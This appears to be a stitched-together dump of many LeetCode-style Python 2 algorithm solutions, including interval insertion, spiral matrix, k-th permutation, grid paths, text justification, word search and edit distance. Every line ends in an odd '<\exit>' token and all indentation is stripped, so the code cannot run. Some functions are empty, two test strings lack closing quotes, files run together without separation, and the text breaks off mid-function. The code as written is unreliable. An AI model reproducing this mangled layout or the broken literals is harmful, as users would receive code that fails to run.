def __repr__(self):<\exit>
return repr(self.__str__())<\exit>
class Solution(object):<\exit>
def insert(self, itvls, newItvl):<\exit>
s, e = newItvl.start, newItvl.end<\exit>
left = filter(lambda x: x.end < s, itvls)<\exit>
right = filter(lambda x: x.start > e, itvls)<\exit>
if len(left)+len(right) != len(itvls):<\exit>
s = min(s, itvls[len(left)].start)<\exit>
e = max(e, itvls[-len(right)-1].end)<\exit>
return left + [Interval(s, e)] + right<\exit>
def insert_itr(self, itvls, newItvl):<\exit>
class SolutionSlow(object):<\exit>
def insert(self, itvls, newItvl):<\exit>
return self.merge(itvls+[newItvl])<\exit>
def merge(self, itvls):<\exit>
itvls.sort(cmp=lambda a, b: a.start - b.start)<\exit>
ret = [itvls[0]]<\exit>
for cur in itvls[1:]:<\exit>
pre = ret[-1]<\exit>
if cur.start <= pre.end:<\exit>
pre.end = max(pre.end, cur.end)<\exit>
else:<\exit>
ret.append(cur)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
lst = [[1, 2], [3, 5], [6, 7], [8, 10], [12, 16]]<\exit>
insert = [4, 9]<\exit>
lst_interval = []<\exit>
for item in lst:<\exit>
lst_interval.append(Interval(item[0], item[1]))<\exit>
print Solution().insert(lst_interval, Interval(insert[0], insert[1]))<\exit>
class Solution:<\exit>
def generateMatrix(self, n):<\exit>
left = 0<\exit>
right = n - 1<\exit>
top = 0<\exit>
bottom = n - 1<\exit>
result = [[-1 for _ in xrange(n)] for _ in xrange(n)]<\exit>
num = 1<\exit>
while left <= right and top <= bottom:<\exit>
for i in xrange(left, right + 1):<\exit>
result[top][i] = num<\exit>
num += 1<\exit>
for i in xrange(top + 1, bottom):<\exit>
result[i][right] = num<\exit>
num += 1<\exit>
for i in xrange(right, left, -1):<\exit>
result[bottom][i] = num<\exit>
num += 1<\exit>
for i in xrange(bottom, top, -1):<\exit>
result[i][left] = num<\exit>
num += 1<\exit>
left += 1<\exit>
right -= 1<\exit>
top += 1<\exit>
bottom -= 1<\exit>
return result<\exit>
class SolutionError:<\exit>
def generateMatrix(self, n):<\exit>
left = 0<\exit>
right = n - 1<\exit>
top = 0<\exit>
bottom = n - 1<\exit>
result = [[-1 for _ in xrange(n)] for _ in xrange(n)]<\exit>
num = 1<\exit>
while left <= right and top <= bottom:<\exit>
for i in xrange(left, right):<\exit>
result[top][i] = num<\exit>
num += 1<\exit>
for i in xrange(top, bottom):<\exit>
result[i][right] = num<\exit>
num += 1<\exit>
for i in xrange(right, left, -1):<\exit>
result[bottom][i] = num<\exit>
num += 1<\exit>
for i in xrange(bottom, top, -1):<\exit>
result[i][left] = num<\exit>
num += 1<\exit>
left += 1<\exit>
right -= 1<\exit>
top += 1<\exit>
bottom -= 1<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
result = Solution().generateMatrix(4)<\exit>
for row in result:<\exit>
print row<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def rotateRight(self, head, k):<\exit>
if not head:<\exit>
return None<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
length = 0<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
length += 1<\exit>
pre = pre.next<\exit>
last = pre<\exit>
k = k%length<\exit>
count = 0<\exit>
pre = dummy<\exit>
while count<length-k:<\exit>
count += 1<\exit>
pre = pre.next<\exit>
if k!=0:<\exit>
pre.next, dummy.next, last.next = None, pre.next, dummy.next<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
length = 1<\exit>
lst = [ListNode(i+1) for i in xrange(length)]<\exit>
for i in range(length-1):<\exit>
lst[i].next = lst[i+1]<\exit>
Solution().rotateRight(lst[0], 1)<\exit>
import math<\exit>
class Solution(object):<\exit>
def getPermutation(self, n, k):<\exit>
k -= 1<\exit>
array = range(1, n+1)<\exit>
k %= math.factorial(n)<\exit>
ret = []<\exit>
for i in xrange(n-1, -1, -1):<\exit>
idx, k = divmod(k, math.factorial(i))<\exit>
ret.append(array.pop(idx))<\exit>
return "".join(map(str, ret))<\exit>
def getPermutation(self, n, k):<\exit>
fac = [1 for _ in xrange(n)]<\exit>
for i in xrange(1, n):<\exit>
fac[i] = fac[i-1]*i<\exit>
k -= 1<\exit>
a = [0 for _ in xrange(n)]<\exit>
for i in xrange(n-1, -1, -1):<\exit>
a[n-1-i] = k/fac[i]<\exit>
k %= fac[i]<\exit>
candidate = range(1, n+1)<\exit>
visited = [False for _ in xrange(n)]<\exit>
for ind, val in enumerate(a):<\exit>
i = 0<\exit>
cnt = 0<\exit>
while True:<\exit>
if visited[i]:<\exit>
i += 1<\exit>
else:<\exit>
if cnt == val: break<\exit>
cnt += 1<\exit>
i += 1<\exit>
a[ind] = candidate[i]<\exit>
visited[i] = True<\exit>
return "".join(map(str, a))<\exit>
def getPermutation_complicated(self, n, k):<\exit>
k -= 1<\exit>
factorial = 1<\exit>
for i in xrange(1, n):<\exit>
factorial *= i<\exit>
result = []<\exit>
array = range(1, n+1)<\exit>
for i in reversed(xrange(1, n)):<\exit>
index = k/factorial<\exit>
result.append(array[index])<\exit>
array = array[:index]+array[index+1:]<\exit>
k = k%factorial<\exit>
factorial /= i<\exit>
result.append(array[0])<\exit>
return "".join(str(element) for element in result)<\exit>
class Solution_TLE:<\exit>
def __init__(self):<\exit>
self.counter = 0<\exit>
def getPermutation(self, n, k):<\exit>
if not n:<\exit>
return<\exit>
sequence = range(1, n+1)<\exit>
result = self.get_kth_permutation_dfs(sequence, k, [])<\exit>
return "".join(str(element) for element in result)<\exit>
def get_kth_permutation_dfs(self, remaining_seq, k, cur):<\exit>
if not remaining_seq:<\exit>
self.counter += 1<\exit>
if self.counter == k:<\exit>
return cur<\exit>
for ind, val in enumerate(remaining_seq):<\exit>
result = self.get_kth_permutation_dfs(remaining_seq[:ind]+remaining_seq[ind+1:], k, cur+[val])<\exit>
if result: return result<\exit>
if __name__ == "__main__":<\exit>
assert Solution().getPermutation(4, 6) == "1432"<\exit>
assert Solution().getPermutation(2, 2) == "21"<\exit>
assert Solution().getPermutation(3, 1) == "123"<\exit>
assert Solution().getPermutation(3, 5) == "312"<\exit>
print Solution().getPermutation(9, 171669)<\exit>
import math<\exit>
class Solution(object):<\exit>
def uniquePaths(self, m, n):<\exit>
m -= 1<\exit>
n -= 1<\exit>
return math.factorial(m+n) / (math.factorial(n) * math.factorial(m))<\exit>
def uniquePathsDP(self, m, n):<\exit>
F = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
F[1][0] = 1<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
F[i][j] = F[i-1][j] + F[i][j-1]<\exit>
return F[m][n]<\exit>
def uniquePathsNormal(self, m, n):<\exit>
F = [[0 for _ in xrange(n)] for _ in xrange(m)]<\exit>
F[0][0] = 1<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if i == 0 and j == 0: continue<\exit>
if i == 0: F[i][j] = F[i][j-1]<\exit>
elif j == 0: F[i][j] = F[i-1][j]<\exit>
else: F[i][j] = F[i-1][j]+F[i][j-1]<\exit>
return F[m-1][n-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().uniquePaths(3, 7) == 28<\exit>
class Solution:<\exit>
def minPathSum(self, grid):<\exit>
if not grid:<\exit>
return 0<\exit>
row_cnt = len(grid)<\exit>
col_cnt = len(grid[0])<\exit>
dp = [[1<<31 for _ in xrange(col_cnt)] for _ in xrange(row_cnt)]<\exit>
for i in xrange(row_cnt):<\exit>
for j in xrange(col_cnt):<\exit>
if i==0 and j==0:<\exit>
dp[i][j] = grid[i][j]<\exit>
elif i==0:<\exit>
dp[i][j] = dp[i][j-1]+grid[i][j]<\exit>
elif j==0:<\exit>
dp[i][j] = dp[i-1][j]+grid[i][j]<\exit>
else:<\exit>
dp[i][j] = min(dp[i-1][j], dp[i][j-1])+grid[i][j]<\exit>
return dp[row_cnt-1][col_cnt-1]<\exit>
class Solution:<\exit>
def uniquePathsWithObstacles(self, obstacleGrid):<\exit>
m = len(obstacleGrid)<\exit>
n = len(obstacleGrid[0])<\exit>
if obstacleGrid[0][0]==1 or obstacleGrid[m-1][n-1]==1:<\exit>
return 0<\exit>
path = [[0 for _ in range(n)] for _ in range(m)]<\exit>
path[0][0] = 1<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if i==0 and j==0:<\exit>
continue<\exit>
if i==0:<\exit>
path[i][j] = path[i][j-1] if obstacleGrid[i][j-1]==0 else 0<\exit>
elif j==0:<\exit>
path[i][j] = path[i-1][j] if obstacleGrid[i-1][j]==0 else 0<\exit>
else:<\exit>
if obstacleGrid[i][j-1]==0 and obstacleGrid[i-1][j]==0:<\exit>
path[i][j] = path[i-1][j]+path[i][j-1]<\exit>
elif obstacleGrid[i][j-1]==0:<\exit>
path[i][j] = path[i][j-1]<\exit>
elif obstacleGrid[i-1][j]==0:<\exit>
path[i][j] = path[i-1][j]<\exit>
else:<\exit>
path[i][j]=0<\exit>
return path[m-1][n-1]<\exit>
if __name__=="__main__":<\exit>
grid = [[0, 0], [1, 1], [0, 0]]<\exit>
assert Solution().uniquePathsWithObstacles(grid)==0<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
def __str__(self):<\exit>
return "%d, %s"%(self.val, self.next)<\exit>
class Solution:<\exit>
def mergeTwoLists(self, l1, l2):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = l1<\exit>
pre = dummy<\exit>
the_other = l2<\exit>
while pre and pre.next:<\exit>
cur = pre.next<\exit>
if the_other and cur.val>the_other.val:<\exit>
temp = the_other.next<\exit>
pre.next, the_other.next = the_other, cur<\exit>
the_other = temp<\exit>
pre = pre.next<\exit>
if the_other:<\exit>
pre.next = the_other<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
length = 10<\exit>
list1 = [ListNode(2*i) for i in xrange(length)]<\exit>
list2 = [ListNode(2*i+1) for i in xrange(length)]<\exit>
for i in xrange(length-1):<\exit>
list1[i].next = list1[i+1]<\exit>
list2[i].next = list2[i+1]<\exit>
lst = Solution().mergeTwoLists(list1[0], list2[0])<\exit>
print lst<\exit>
class Solution(object):<\exit>
def plusOne(self, digits):<\exit>
for i in xrange(len(digits)-1, -1, -1):<\exit>
digits[i] += 1<\exit>
if digits[i] < 10:<\exit>
return digits<\exit>
else:<\exit>
digits[i] -= 10<\exit>
digits.insert(0, 1)<\exit>
return digits<\exit>
def plusOne(self, digits):<\exit>
digits.reverse()<\exit>
digits[0] += 1<\exit>
carry = 0<\exit>
for i in xrange(len(digits)):<\exit>
digits[i] += carry<\exit>
if digits[i] > 9:<\exit>
digits[i] -= 10<\exit>
carry = 1<\exit>
else:<\exit>
carry = 0<\exit>
break<\exit>
if carry:<\exit>
digits.append(1)<\exit>
digits.reverse()<\exit>
return digits<\exit>
if __name__ == "__main__":<\exit>
digits = [9]<\exit>
assert Solution().plusOne(digits) == [1, 0]<\exit>
class Solution:<\exit>
def isNumber_builtin(self, s):<\exit>
try:<\exit>
float(s)<\exit>
return True<\exit>
except ValueError:<\exit>
return False<\exit>
def isNumber(self, s):<\exit>
INVALID = 0<\exit>
SPACE = 1<\exit>
SIGN = 2<\exit>
DIGIT = 3<\exit>
DOT = 4<\exit>
E = 5<\exit>
T = [<\exit>
[-1, 0, 3, 1, 2,-1],<\exit>
[-1, 8,-1, 1, 4, 5],<\exit>
[-1,-1,-1, 4,-1,-1],<\exit>
[-1,-1,-1, 1, 2,-1],<\exit>
[-1, 8,-1, 4,-1, 5],<\exit>
[-1,-1, 6, 7,-1,-1],<\exit>
[-1,-1,-1, 7,-1,-1],<\exit>
[-1, 8,-1, 7,-1,-1],<\exit>
[-1, 8,-1,-1,-1,-1],<\exit>
]<\exit>
state = 0<\exit>
for char in s:<\exit>
if state==-1:<\exit>
return False<\exit>
if char==" ":<\exit>
token = SPACE<\exit>
elif char in ("-", "+"):<\exit>
token = SIGN<\exit>
elif char in map(str, range(10)):<\exit>
token = DIGIT<\exit>
elif char==".":<\exit>
token = DOT<\exit>
elif char in ("e", "E"):<\exit>
token = E<\exit>
else:<\exit>
token = INVALID<\exit>
state = T[state][token]<\exit>
if state in (1, 4, 7, 8):<\exit>
return True<\exit>
else:<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
assert Solution().isNumber(".2e81")==True<\exit>
assert Solution().isNumber("6+1")==False<\exit>
assert Solution().isNumber("1 a")==False<\exit>
assert Solution().isNumber("1e10")==True<\exit>
assert Solution().isNumber(" 0.1")==True<\exit>
assert Solution().isNumber("abc")==False<\exit>
class Solution:<\exit>
def addBinary_builtin(self, a, b):<\exit>
a = int(a, 2)<\exit>
b = int(b, 2)<\exit>
return bin(a+b)[2:]<\exit>
def addBinary(self, a, b):<\exit>
if len(a)>len(b):<\exit>
a, b = b, a<\exit>
a, b = list(a), list(b)<\exit>
a.reverse()<\exit>
b.reverse()<\exit>
for i in xrange(len(a)):<\exit>
if a[i]=="0":<\exit>
continue<\exit>
elif b[i]=="0":<\exit>
b[i] = "1"<\exit>
continue<\exit>
else:<\exit>
b[i] = "0"<\exit>
if i==len(b)-1:<\exit>
b.append("1")<\exit>
else:<\exit>
for j in range(i+1, len(b)):<\exit>
if b[j]=="0":<\exit>
b[j] = "1"<\exit>
break<\exit>
else:<\exit>
b[j] = "0"<\exit>
if j==len(b)-1:<\exit>
b.append("1")<\exit>
break<\exit>
b.reverse()<\exit>
return "".join(b)<\exit>
if __name__=="__main__":<\exit>
print Solution().addBinary("11", "1")<\exit>
class Solution(object):<\exit>
def simplifyPath(self, path):<\exit>
path = path.split("/")<\exit>
path = filter(lambda x: x not in ("", " ", "."), path)<\exit>
for idx in xrange(len(path)):<\exit>
val = path[idx]<\exit>
if val == "..":<\exit>
path[idx] = "."<\exit>
i = idx-1<\exit>
while i >= 0 and path[i] == ".": i -= 1<\exit>
if i >= 0: path[i] = "."<\exit>
path = filter(lambda x: x not in (".",), path)<\exit>
if not path:<\exit>
return "/"<\exit>
path = map(lambda x: "/"+x, path)<\exit>
return "".join(path)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().simplifyPath("/a/./b///../c/../././../d/..//../e/./f/./g/././//.//h///././/..///") == "/e/f/g"<\exit>
assert Solution().simplifyPath("/a/./b/../../c/") == "/c"<\exit>
assert Solution().simplifyPath("/../") == "/<\exit>
from typing import List<\exit>
class Solution:<\exit>
def fullJustify(self, words: List[str], maxWidth: int) -> List[str]:<\exit>
ret = []<\exit>
char_cnt = 0<\exit>
cur_words = []<\exit>
for w in words:<\exit>
cur_words.append(w)<\exit>
char_cnt += len(w)<\exit>
if char_cnt + len(cur_words) - 1 > maxWidth:<\exit>
cur_words.pop()<\exit>
char_cnt -= len(w)<\exit>
for i in range(maxWidth - char_cnt):<\exit>
cur_words[i % max(1, len(cur_words) - 1)] += " "<\exit>
ret.append("".join(cur_words))<\exit>
cur_words = [w]<\exit>
char_cnt = len(w)<\exit>
last = " ".join(cur_words)<\exit>
ret.append(last + " " * (maxWidth - len(last)))<\exit>
return ret<\exit>
class Solution2:<\exit>
def fullJustify(self, words: List[str], maxWidth: int) -> List[str]:<\exit>
ret = []<\exit>
char_cnt = 0<\exit>
cur_words = []<\exit>
for w in words:<\exit>
if char_cnt + len(w) + len(cur_words) > maxWidth:<\exit>
for i in range(maxWidth - char_cnt):<\exit>
cur_words[i % max(1, len(cur_words) - 1)] += " "<\exit>
ret.append("".join(cur_words))<\exit>
cur_words = []<\exit>
char_cnt = 0<\exit>
cur_words.append(w)<\exit>
char_cnt += len(w)<\exit>
last = " ".join(cur_words)<\exit>
ret.append(last + " " * (maxWidth - len(last)))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().fullJustify(["This", "is", "an", "example", "of", "text", "justification."], 16) == ["This    is    an","example  of text","justification.  "]<\exit>
assert Solution().fullJustify(["What","must","be","acknowledgment","shall","be"], 16) == ["What   must   be","acknowledgment  ","shall be        "]<\exit>
class Solution:<\exit>
def climbStairs_save_memory(self, n):<\exit>
f_n_minus_2 = 1<\exit>
f_n_minus_1 = 2<\exit>
if n==1: return f_n_minus_2<\exit>
if n==2: return f_n_minus_1<\exit>
fn = 0<\exit>
for i in range(2, n):<\exit>
fn = f_n_minus_1 +f_n_minus_2<\exit>
f_n_minus_2 = f_n_minus_1<\exit>
f_n_minus_1 = fn<\exit>
return fn<\exit>
def climbStairs(self, n):<\exit>
if n==1: return 1<\exit>
if n==2: return 2<\exit>
f = [0 for _ in xrange(n+1)]<\exit>
f[0] = 0<\exit>
f[1] = 1<\exit>
f[2] = 2<\exit>
for i in xrange(3, n+1):<\exit>
f[i] = f[i-1]+f[i-2]<\exit>
return f[n]<\exit>
if __name__=="__main__":<\exit>
print Solution().climbStairs(3)<\exit>
class Solution:<\exit>
def fullJustify(self, words, L):<\exit>
result = []<\exit>
self.break_line(words, L, result)<\exit>
return self.distribute_space(L, result)<\exit>
def break_line(self, words, L, result):<\exit>
if not words:<\exit>
return<\exit>
cur_length = -1<\exit>
lst = []<\exit>
i = 0<\exit>
while i<len(words):<\exit>
word = words[i]<\exit>
cur_length += 1<\exit>
cur_length += len(word)<\exit>
if cur_length>L: break<\exit>
lst.append(word)<\exit>
i += 1<\exit>
result.append(lst)<\exit>
self.break_line(words[i:], L, result)<\exit>
def distribute_space(self, L, result):<\exit>
new_result = []<\exit>
for ind, line in enumerate(result):<\exit>
word_cnt = len(line)<\exit>
str_builder = []<\exit>
space_cnt = L-sum(len(word) for word in line)<\exit>
hole_cnt = word_cnt-1<\exit>
if ind<len(result)-1:<\exit>
if hole_cnt>0:<\exit>
space = space_cnt/hole_cnt<\exit>
remain = space_cnt%hole_cnt<\exit>
for word in line[:-1]:<\exit>
str_builder.append(word)<\exit>
str_builder.append(" "*space)<\exit>
if remain>0:<\exit>
str_builder.append(" ")<\exit>
remain -= 1<\exit>
str_builder.append(line[-1])<\exit>
else:<\exit>
str_builder.append(line[-1])<\exit>
str_builder.append(" "*space_cnt)<\exit>
else:<\exit>
str_builder = [" ".join(line)]<\exit>
str_builder.append(" "*(space_cnt-hole_cnt))<\exit>
new_result.append("".join(str_builder))<\exit>
return new_result<\exit>
if __name__=="__main__":<\exit>
print Solution().fullJustify(["This", "is", "an", "example", "of", "text", "justification."], 16)<\exit>
print Solution().fullJustify(["What","must","be","shall","be."], 12)<\exit>
class Solution:<\exit>
def sqrt(self, x):<\exit>
if x==0: return 0<\exit>
m = x<\exit>
while True:<\exit>
m_before = m<\exit>
m = m - float(m*m-x)/(2*m)<\exit>
if abs(m-m_before)<1e-7: break<\exit>
return int(m)<\exit>
if __name__=="__main__":<\exit>
print Solution().sqrt(2)<\exit>
class Solution:<\exit>
def minDistance(self, word1, word2):<\exit>
m = len(word1)<\exit>
n = len(word2)<\exit>
d = [[-1 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(m+1):<\exit>
d[i][0] = i<\exit>
for j in xrange(n+1):<\exit>
d[0][j] = j<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if word1[i-1]==word2[j-1]:<\exit>
d[i][j] = d[i-1][j-1]<\exit>
else:<\exit>
d[i][j]= min(<\exit>
d[i-1][j]+1,<\exit>
d[i][j-1]+1,<\exit>
d[i-1][j-1]+1<\exit>
)<\exit>
return d[-1][-1]<\exit>
class Solution:<\exit>
def setZeroes_error(self, matrix):<\exit>
if not matrix:<\exit>
return<\exit>
m = len(matrix)<\exit>
n = len(matrix[0])<\exit>
for row in xrange(m):<\exit>
for col in xrange(n):<\exit>
if matrix[row][col]==0:<\exit>
matrix[0][col]=0<\exit>
matrix[row][0]=0<\exit>
for row in xrange(m):<\exit>
if matrix[row][0]==0:<\exit>
for col in xrange(n):<\exit>
matrix[row][col] = 0<\exit>
for col in xrange(n):<\exit>
if matrix[0][col]==0:<\exit>
for row in xrange(m):<\exit>
matrix[row][col] = 0<\exit>
def setZeroes(self, matrix):<\exit>
if not matrix:<\exit>
return<\exit>
m = len(matrix)<\exit>
n = len(matrix[0])<\exit>
clear_first_row = False<\exit>
clear_first_col = False<\exit>
for row in xrange(m):<\exit>
if matrix[row][0]==0:<\exit>
clear_first_col = True<\exit>
for col in xrange(n):<\exit>
if matrix[0][col]==0:<\exit>
clear_first_row = True<\exit>
for row in xrange(1, m):<\exit>
for col in xrange(1, n):<\exit>
if matrix[row][col]==0:<\exit>
matrix[0][col] = 0<\exit>
matrix[row][0] = 0<\exit>
for row in xrange(1, m):<\exit>
if matrix[row][0]==0:<\exit>
for col in xrange(n):<\exit>
matrix[row][col] = 0<\exit>
for col in xrange(1, n):<\exit>
if matrix[0][col]==0:<\exit>
for row in xrange(m):<\exit>
matrix[row][col] = 0<\exit>
if clear_first_row:<\exit>
for col in xrange(n):<\exit>
matrix[0][col] = 0<\exit>
if clear_first_col:<\exit>
for row in xrange(m):<\exit>
matrix[row][0] = 0<\exit>
class Solution(object):<\exit>
def searchMatrix(self, mat, target):<\exit>
if not mat:<\exit>
return False<\exit>
m = len(mat)<\exit>
n = len(mat[0])<\exit>
lo = 0<\exit>
hi = m<\exit>
while lo < hi:<\exit>
mid = (lo+hi)/2<\exit>
if mat[mid][0] == target:<\exit>
return True<\exit>
elif mat[mid][0] < target:<\exit>
lo = mid+1<\exit>
else:<\exit>
hi = mid<\exit>
lst = mat[lo-1]<\exit>
lo = 0<\exit>
hi = n<\exit>
while lo < hi:<\exit>
mid = (lo+hi)/2<\exit>
if lst[mid] == target:<\exit>
return True<\exit>
elif lst[mid] < target:<\exit>
lo = mid+1<\exit>
else:<\exit>
hi = mid<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().searchMatrix([[1], [3]], 3) == True<\exit>
class Solution:<\exit>
def sortColors(self, A):<\exit>
RED, WHITE, BLUE = 0, 1, 2<\exit>
red_end_ptr = -1<\exit>
blue_start_ptr= len(A)<\exit>
i = 0<\exit>
while i<blue_start_ptr:<\exit>
if A[i]==WHITE:<\exit>
i += 1<\exit>
elif A[i]==RED:<\exit>
red_end_ptr+=1<\exit>
A[red_end_ptr], A[i] = A[i], A[red_end_ptr]<\exit>
i += 1<\exit>
else:<\exit>
blue_start_ptr -= 1<\exit>
A[blue_start_ptr], A[i] = A[i], A[blue_start_ptr]<\exit>
if __name__=="__main__":<\exit>
Solution().sortColors([1, 2, 0])<\exit>
import sys<\exit>
class Solution(object):<\exit>
def minWindow(self, S, T):<\exit>
min_win = [0, sys.maxint]<\exit>
w_cnt = [0 for _ in range(256)]<\exit>
t_cnt = [0 for _ in range(256)]<\exit>
for char in T:<\exit>
t_cnt[ord(char)] += 1<\exit>
appeared_cnt = 0<\exit>
lo = 0<\exit>
for hi in xrange(1, len(S)+1):<\exit>
val = S[hi-1]<\exit>
if t_cnt[ord(val)] > 0:<\exit>
w_cnt[ord(val)] += 1<\exit>
if t_cnt[ord(val)] > 0 and w_cnt[ord(val)] <= t_cnt[ord(val)]:<\exit>
appeared_cnt += 1<\exit>
if appeared_cnt == len(T):<\exit>
while w_cnt[ord(S[lo])] > t_cnt[ord(S[lo])] or t_cnt[ord(S[lo])] == 0:<\exit>
if w_cnt[ord(S[lo])] > 0: w_cnt[ord(S[lo])] -= 1<\exit>
lo += 1<\exit>
if min_win[1]-min_win[0] > hi-lo:<\exit>
min_win[0], min_win[1] = lo, hi<\exit>
if min_win[1] == sys.maxint:<\exit>
return ""<\exit>
else:<\exit>
return S[min_win[0]:min_win[1]]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minWindow("ADOBECODEBANC", "ABC") == "BANC<\exit>
class Solution:<\exit>
def exist(self, board, word):<\exit>
if not board:<\exit>
return<\exit>
m = len(board)<\exit>
n = len(board[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if board[i][j]==word[0]:<\exit>
visited[i][j] = True<\exit>
if self.search(board, i, j, word[1:], visited):<\exit>
return True<\exit>
visited[i][j] = False<\exit>
return False<\exit>
def search(self, board, pre_row, pre_col, word, visited):<\exit>
if not word:<\exit>
return True<\exit>
m = len(board)<\exit>
n = len(board[0])<\exit>
next_positions = [(pre_row-1, pre_col), (pre_row+1, pre_col), (pre_row, pre_col-1), (pre_row, pre_col+1)]<\exit>
for next_position in next_positions:<\exit>
if 0<=next_position[0]<m and 0<=next_position[1]<n:<\exit>
if visited[next_position[0]][next_position[1]]==False and board[next_position[0]][next_position[1]]==word[0]:<\exit>
visited[next_position[0]][next_position[1]] = True<\exit>
if self.search(board, next_position[0], next_position[1], word[1:], visited):<\exit>
return True<\exit>
visited[next_position[0]][next_position[1]] = False<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
board = [<\exit>
"ABCE",<\exit>
"SFCS",<\exit>
"ADEE"<\exit>
]<\exit>
word = "ABCCED"<\exit>
print Solution().exist(board, word)<\exit>
class Solution:<\exit>
def subsets(self, S):<\exit>
S.sort()<\exit>
result = []<\exit>
self.generate_subsets(S, [], result)<\exit>
return result<\exit>
def generate_subsets(self, S, current, result):<\exit>
result.append(current)<\exit>
for ind, val in enumerate(S):<\exit>
self.generate_subsets(S[ind+1:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().subsets([1, 2, 3])<\exit>
class Solution:<\exit>
def combine(self, n, k):<\exit>
result = []<\exit>
nums = [i+1 for i in xrange(n)]<\exit>
self.get_combination(k, nums, [], result)<\exit>
return result<\exit>
def get_combination(self, k, nums, current, result):<\exit>
if len(current)==k:<\exit>
result.append(current)<\exit>
return<\exit>
elif len(current)+len(nums)<k:<\exit>
return<\exit>
for ind, val in enumerate(nums):<\exit>
self.get_combination(k, nums[ind+1:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().combine(4, 2)<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
dirs = [(0, -1), (0, 1), (1, 0), (-1, 0)]<\exit>
class Solution:<\exit>
def exist(self, board: List[List[str]], word: str) -> bool:<\exit>
m, n = len(board), len(board[0])<\exit>
visited = defaultdict(lambda: defaultdict(bool))<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if board[i][j] == word[0]:<\exit>
if self.dfs(board, visited, i, j, word, 1):<\exit>
return True<\exit>
return False<\exit>
def dfs(self, board, visited, i, j, word, idx):<\exit>
visited[i][j] = True<\exit>
if idx >= len(word):<\exit>
return True<\exit>
m, n = len(board), len(board[0])<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J] and board[I][J] == word[idx]:<\exit>
if self.dfs(board, visited, I, J, word, idx + 1):<\exit>
return True<\exit>
visited[i][j] = False<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().exist([<\exit>
["A","B","C","E"],<\exit>
["S","F","E","S"],<\exit>
["A","D","E","E"]<\exit>
], "ABCESEEEFS") == True<\exit>
class Solution:<\exit>
def search_set(self, A, target):<\exit>
A = list(set(A))<\exit>
length = len(A)<\exit>
start = 0<\exit>
end = length-1<\exit>
while start<=end:<\exit>
mid = (start+end)/2<\exit>
if A[mid]==target:<\exit>
return True<\exit>
if A[start]<A[mid]<A[end]:<\exit>
if target>A[mid]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid-1<\exit>
elif A[start]>A[mid] and A[mid]<A[end]:<\exit>
if target>A[mid] and target<=A[end]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid-1<\exit>
else:<\exit>
if target<A[mid] and target>=A[start]:<\exit>
end = mid-1<\exit>
else:<\exit>
start = mid+1<\exit>
return False<\exit>
def search(self, A, target):<\exit>
length = len(A)<\exit>
start = 0<\exit>
end = length-1<\exit>
while start<=end:<\exit>
mid = (start+end)/2<\exit>
if A[mid]==target:<\exit>
return True<\exit>
if A[start]==A[mid]:<\exit>
start += 1<\exit>
elif A[start]<A[mid]<=A[end]:<\exit>
if target>A[mid]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid-1<\exit>
elif A[start]>A[mid] and A[mid]<=A[end]:<\exit>
if target>A[mid] and target<=A[end]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid-1<\exit>
else:<\exit>
if target<A[mid] and target>=A[start]:<\exit>
end = mid-1<\exit>
else:<\exit>
start = mid+1<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
assert Solution().search([1,1,3,1], 3)==True<\exit>
class Solution:<\exit>
def removeDuplicates_complicated(self, A):<\exit>
length = len(A)<\exit>
if length<=2:<\exit>
return length<\exit>
closed_ptr = 0<\exit>
duplicate_count = 0<\exit>
open_ptr = closed_ptr+1<\exit>
while open_ptr<length:<\exit>
if A[closed_ptr]==A[open_ptr]:<\exit>
if duplicate_count>=1:<\exit>
try:<\exit>
while A[closed_ptr]==A[open_ptr]:<\exit>
open_ptr+=1<\exit>
duplicate_count = 0<\exit>
except IndexError:<\exit>
break<\exit>
else:<\exit>
duplicate_count +=1<\exit>
else:<\exit>
duplicate_count = 0<\exit>
A[closed_ptr+1] = A[open_ptr]<\exit>
closed_ptr += 1<\exit>
open_ptr += 1<\exit>
return closed_ptr+1<\exit>
def removeDuplicates(self, A):<\exit>
length = len(A)<\exit>
if length<=2:<\exit>
return length<\exit>
close_ptr = 0<\exit>
duplicate_once = False<\exit>
for open_ptr in range(close_ptr+1, length):<\exit>
if A[close_ptr]!=A[open_ptr]:<\exit>
duplicate_once = False<\exit>
close_ptr += 1<\exit>
A[close_ptr] = A[open_ptr]<\exit>
